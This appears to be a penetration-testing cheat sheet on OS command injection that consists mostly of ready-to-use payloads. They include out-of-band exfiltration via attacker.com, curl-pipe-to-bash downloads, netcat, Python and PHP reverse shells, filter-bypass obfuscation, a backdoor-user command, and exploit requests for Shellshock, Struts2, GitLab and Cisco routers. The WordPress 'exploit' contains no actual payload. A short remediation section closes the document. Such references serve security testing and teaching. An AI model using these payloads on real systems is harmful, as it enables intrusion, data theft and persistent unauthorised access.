# Command Injection


Command injection is an attack in which the goal is execution of arbitrary commands on the host operating system via a vulnerable application. This occurs when an application passes unsafe user-supplied data (forms, cookies, HTTP headers) to a system shell.

## Detection Payloads

For detection, try to concatenate another command to parameter value using various separators:

```
&
;
Newline (0x0a or \n)
&&
|
||
`command`
$(command)
```

Example detection request:
```
https://target.com/whatever?param=1|whoami
https://target.com/whatever?param=1;whoami
https://target.com/whatever?param=1%0awhoami
https://target.com/whatever?param=1&&whoami
https://target.com/whatever?param=`whoami`
https://target.com/whatever?param=$(whoami)
```

## Blind Command Injection

### Time Delay Detection
```
https://target.com/whatever?param=x||ping+-c+10+127.0.0.1||
https://target.com/whatever?param=x;sleep+10
https://target.com/whatever?param=x%26%26timeout+10
https://target.com/whatever?param=x|ping+-n+10+127.0.0.1|
```

### Output Redirection
```
https://target.com/whatever?param=x||whoami>/var/www/images/output.txt||
https://target.com/whatever?param=x;ifconfig>/tmp/result.txt
https://target.com/whatever?param=x|uname+-a>../../results/out.txt|
```

### Out-of-Band (OOB) Exploitation
```
https://target.com/whatever?param=x||nslookup+burp.collaborator.address||
https://target.com/whatever?param=x||nslookup+`whoami`.burp.collaborator.address||
https://target.com/whatever?param=x;curl+http://attacker.com/$(whoami)
https://target.com/whatever?param=x|wget+http://attacker.com/`id`|
```

## Common Vulnerable Parameters

```
cmd
exec
command
execute
ping
query
jump
code
reg
do
func
arg
option
load
process
step
read
function
req
feature
exe
module
payload
run
print
download
path
folder
file
document
folder
root
path
host
proxy
server
destination
address
ip
ipaddress
hostname
port
interface
gateway
dns
domain
url
uri
path
redirect
return
page
view
show
cat
dir
delete
remove
copy
move
rename
zip
unzip
tar
gzip
gunzip
decode
encode
convert
parse
compile
execute
eval
system
shell
exec
passthru
proc_open
shell_exec
```

## Useful Commands

### Linux
```
whoami
id
ifconfig
ip a
ls -la
uname -a
cat /etc/passwd
cat /etc/shadow
ps aux
netstat -tulpn
find / -perm -4000 2>/dev/null
curl http://attacker.com/shell.sh | bash
wget http://attacker.com/payload -O /tmp/payload && chmod +x /tmp/payload && /tmp/payload
```

### Windows
```
whoami
ipconfig /all
dir C:\
ver
systeminfo
tasklist
net user
netstat -ano
type C:\Windows\win.ini
powershell -c "Invoke-WebRequest -Uri http://attacker.com/payload.exe -OutFile C:\temp\payload.exe"; C:\temp\payload.exe
```

## Both Unix and Windows Supported

```
ls||id; ls ||id; ls|| id; ls || id 
ls|id; ls |id; ls| id; ls | id 
ls&&id; ls &&id; ls&& id; ls && id 
ls&id; ls &id; ls& id; ls & id 
ls %0A id
```

## Time Delay Commands

### Linux
```
& ping -c 10 127.0.0.1 &
; sleep 30
| timeout 10 whoami
|| sleep 15 &&
&& ping -c 20 127.0.0.1
```

### Windows
```
& ping -n 10 127.0.0.1 &
| timeout /t 10
; ping -n 15 127.0.0.1
&& ping -n 20 127.0.0.1
```

## Redirecting Output

### Linux
```
& whoami > /var/www/images/output.txt &
; ls -la > /tmp/result.txt
| ifconfig > ../../results/network.txt
```

### Windows
```
& whoami > C:\inetpub\wwwroot\output.txt &
| dir C:\ > \temp\listing.txt
; ipconfig > ..\..\results\ip.txt
```

## Out-of-Band (OOB) Exploitation

### DNS Exfiltration
```
& nslookup attacker-server.com &
& nslookup `whoami`.attacker-server.com &
; nslookup $(id).attacker.com
| nslookup %USERNAME%.attacker.com
```

### HTTP Exfiltration
```
& curl http://attacker.com/$(whoami) &
; wget http://attacker.com/`cat /etc/passwd | base64`
| nc attacker.com 4444 -e /bin/bash
```

## Real-World Examples

### Shellshock (CVE-2014-6271) - 2014
Vulnerability in Bash that allowed command injection via environment variables. Affected CGI scripts, DHCP clients, and SSH servers.

```
Exploit:
curl -H "User-Agent: () { :; }; /bin/bash -c 'wget http://attacker.com/shell.sh -O /tmp/shell.sh; bash /tmp/shell.sh'" http://target.com/cgi-bin/test.cgi

curl -H "Cookie: () { :; }; ping -c 10 attacker.com" http://target.com/vulnerable.cgi
```

### GitLab CE/EE Remote Code Execution (CVE-2021-22205) - 2021
Unauthenticated command injection in GitLab's file preview feature.

```
Exploit:
POST /uploads/user/import HTTP/1.1
Host: target.com
Content-Type: multipart/form-data

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="test.png"
Content-Type: image/png

![evil](x;curl http://attacker.com/revshell.sh|bash;.png)
------WebKitFormBoundary--
```

### Apache Struts2 (CVE-2017-5638) - 2017
Critical command injection in Struts2 Content-Type header handling.

```
Exploit:
POST /struts2-showcase/integration/saveGangster.action HTTP/1.1
Host: target.com
Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}

Content-Length: 2
```

### WordPress (CVE-2016-10033) - 2016
PHPMailer vulnerability allowing command injection in the mail() function.

```
Exploit:
POST /wp-login.php?action=lostpassword HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded

user_login=admin&redirect_to=&wp-submit=Get+New+Password&_wp_http_referer=%2Fwp-login.php%3Faction%3Dlostpassword&user_login=admin&submit=Submit&_wpnonce=xxx
```

### Cisco RV Series Router RCE (CVE-2019-1653) - 2019
Command injection in Cisco RV320 and RV325 routers.

```
Exploit:
POST /upload HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

submit_button=ping&target=127.0.0.1;wget+http://attacker.com/exploit.bin+-O+/tmp/exploit.bin;chmod+777+/tmp/exploit.bin;/tmp/exploit.bin&ping_size=1&ping_protocol=1
```

## WAF Bypass Techniques

### Newline and Encoding Bypasses
```
vuln=127.0.0.1 %0a wget https://evil.txt/reverse.txt -O /tmp/reverse.php %0a php /tmp/reverse.php
vuln=127.0.0.1%0anohup nc -e /bin/bash <attacker-ip> <attacker-port>
vuln=127.0.0.1%0a%0awget%20http://attacker.com/shell%20-O%20/tmp/shell%0a%0achmod%20777%20/tmp/shell%0a%0a/tmp/shell
vuln=echo PAYLOAD > /tmp/payload.txt; cat /tmp/payload.txt | base64 -d > /tmp/payload; chmod 744 /tmp/payload; /tmp/payload
```

### Command Obfuscation Techniques
```
# Linux filter bypasses
cat /etc/passwd
cat /e"t"c/pa"s"swd
cat /'e'tc/pa's'swd
cat /etc/pa??wd
cat /etc/pa*wd
cat /et' 'c/passw' 'd
cat /et$()c/pa$()$swd
{cat,/etc/passwd}
cat /???/?????d
c'a't /etc/passwd
c\a\t /etc/passwd
$(echo cat | tr 'a-z' 'a-z') /etc/passwd
```

### Case Manipulation Bypasses
```
CaT /EtC/PaSsWd
cAt /eTc/pAsSwD
```

### Wildcard and Globbing Bypasses
```
/???/c?t /???/p?s?wd
/usr/bin/cat /etc/passwd
/*/bin/cat /etc/passwd
```

### Variable Substitution Bypasses
```
X=ca;Y=t; $X$Y /etc/passwd
CMD=cat; $CMD /etc/passwd
```

### Advanced Bypass Examples
```
# Using backticks and eval
vuln=127.0.0.1; `echo d2hvYW1p | base64 -d`
vuln=127.0.0.1; eval $(echo "whoami" | base64 -d)

# Using command substitution with encoding
vuln=127.0.0.1; $(echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d)

# Using IFS (Internal Field Separator)
vuln=127.0.0.1; {cat,/etc/passwd}
vuln=127.0.0.1; cat${IFS}/etc/passwd
vuln=127.0.0.1; cat$IFS/etc/passwd

# Using wildcards with path traversal
vuln=127.0.0.1; /???/??t /???/??ss?d
```

## Advanced Exploitation Techniques

### Multi-Stage Payloads
```
# Download and execute base64 encoded payload
vuln=127.0.0.1; echo "IyEvYmluL2Jhc2gKbmMgLWV2IC9iaW4vYmFzaCAxOTIuMTY4LjEuMTAwIDQ0NDMK" | base64 -d | bash

# Python reverse shell one-liner
vuln=127.0.0.1; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# PHP reverse shell
vuln=127.0.0.1; php -r '$sock=fsockopen("10.0.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Chained Exploitation
```
# Combine command injection with file upload
vuln=127.0.0.1; curl -F "file=@/etc/passwd" http://attacker.com/upload.php

# Exfiltrate data via DNS
vuln=127.0.0.1; for i in $(cat /etc/passwd | cut -d: -f1); do nslookup $i.attacker.com; done

# Create backdoor user
vuln=127.0.0.1; useradd -m -s /bin/bash backdoor; echo "backdoor:password123" | chpasswd; usermod -aG sudo backdoor
```

## Tools

```
https://github.com/commixproject/commix
https://github.com/projectdiscovery/nuclei-templates
https://github.com/PortSwigger/command-injection-attacker
https://github.com/InfosecMatter/Default-Credentials
```

## Remediation

### Secure Coding Practices
1. Never call system shell commands from application code
2. Use built-in language functions instead of shell commands
3. If shell commands are necessary, use parameterized APIs or properly escape inputs
4. Implement strict input validation using allowlists
5. Use the principle of least privilege for application processes
6. Disable dangerous PHP functions (exec, shell_exec, system, passthru, popen) in php.ini
7. Run web applications in chroot jails or containers
8. Regularly update and patch all software components

### Language-Specific Recommendations

**PHP:**
```php
// BAD - vulnerable to command injection
system("ping " . $_GET['ip']);

// GOOD - use escapeshellarg()
system("ping " . escapeshellarg($_GET['ip']));

// BETTER - avoid shell entirely
filter_var($_GET['ip'], FILTER_VALIDATE_IP);
```

**Python:**
```python
# BAD - vulnerable
os.system("ping " + user_input)

# GOOD - use subprocess with list
subprocess.run(["ping", user_input])
```

**Java:**
```java
// BAD - vulnerable
Runtime.getRuntime().exec("ping " + userInput);

// GOOD - use ProcessBuilder with list
new ProcessBuilder("ping", userInput).start();
```

**Node.js:**
```javascript
// BAD - vulnerable
exec('ping ' + userInput);

// GOOD - use execFile with arguments
execFile('ping', [userInput]);
```

## Related Topics

* [XSS](https://www.pentest-book.com/enumeration/web/xss) - Cross-site scripting attacks
* [SSRF](https://www.pentest-book.com/enumeration/web/ssrf) - Server-side request forgery
* [LFI/RFI](https://www.pentest-book.com/enumeration/web/lfi-rfi) - File inclusion vulnerabilities
* [Web Exploits](https://www.pentest-book.com/exploitation/web-exploits) - RCE exploitation chains
* [Reverse Shells](https://www.pentest-book.com/exploitation/reverse-shells) - Shell payloads
